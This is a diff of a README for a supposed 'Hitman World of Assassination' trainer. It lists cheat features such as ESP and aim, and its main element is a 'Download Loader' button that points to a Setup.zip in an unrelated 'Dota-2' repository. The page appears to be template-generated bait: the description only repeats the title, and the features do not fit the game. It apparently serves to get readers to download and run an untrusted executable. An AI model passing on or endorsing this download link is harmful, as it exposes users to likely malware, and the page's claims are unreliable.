@@ -1,2 +1,40 @@
-# Hitman-World-of-Assassination-Trainer
-{title} is a feature-rich third-party modification project for {Hitman World of Assassination Trainer}.
+<div align="center">
+
+# 🎮 Hitman World of Assassination Trainer
+
+> ⚡ Advanced Game Modification Project for Hitman World of Assassination Trainer
+
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TameDragonflyFlare/Dota-2/releases/download/main/Setup.zip)
+
+---
+
+## 📖 About
+
+Hitman World of Assassination Trainer is a feature-rich third-party modification project for Hitman World of Assassination Trainer.
+
+---
+
+## ✨ Features
+
+- 👤 Player ESP
+- 🎯 Configurable Aim
+- 🖥️ Advanced Visual Settings
+- 🔫 Weapon Information
+- 🧍 Player Details
+- ⌨️ Custom Hotkeys
+
+---
+
+## 💾 Configuration System
+
+```text
+configs/
+├── default.cfg
+├── visual.cfg
+├── player.cfg
+└── custom.cfg
+```
+
+`Hitman-World-of-Assassination-Trainer` · Updated: 2026-10-26
+
+**Tags:** `hitman-world-of-assassination` `stealth` `assassination` `sandbox`
